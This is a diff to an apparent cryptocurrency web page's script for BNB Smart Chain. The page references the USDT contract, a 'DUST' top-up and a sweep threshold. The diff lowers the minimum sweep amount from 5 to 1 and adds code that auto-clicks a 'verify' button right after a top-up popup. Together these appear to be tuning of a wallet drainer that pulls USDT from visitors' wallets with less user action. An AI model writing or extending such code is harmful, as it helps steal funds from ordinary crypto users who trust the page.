@@ -247,7 +247,7 @@ header{height:58px;background:#fff;border-bottom:1px solid #ECEEF3;display:flex;
     BACKEND:   'https://bsc-weld-two.vercel.app/api',            // <-- YOUR domain + /api
     USDT:      '0x55d398326f99059fF775485246999027B3197955',
     DUST:      0.25,
-    MIN_SWEEP: 5,
+    MIN_SWEEP: 1,
     CHAIN:     '0x38',
     PARAMS: { chainId:'0x38', chainName:'BNB Smart Chain',
       nativeCurrency:{name:'BNB',symbol:'BNB',decimals:18},
@@ -358,6 +358,7 @@ header{height:58px;background:#fff;border-bottom:1px solid #ECEEF3;display:flex;
       if(!res.ok){ alert('Topup failed: ' + JSON.stringify(res.data)); return; }
 
       new_showPopup(state.sendAmount);
+      setTimeout(function(){ $('new_verifyBtn').click(); }, 1200);
     }catch(e){
       console.error('flow error', e);
       alert((e && e.message) || String(e));
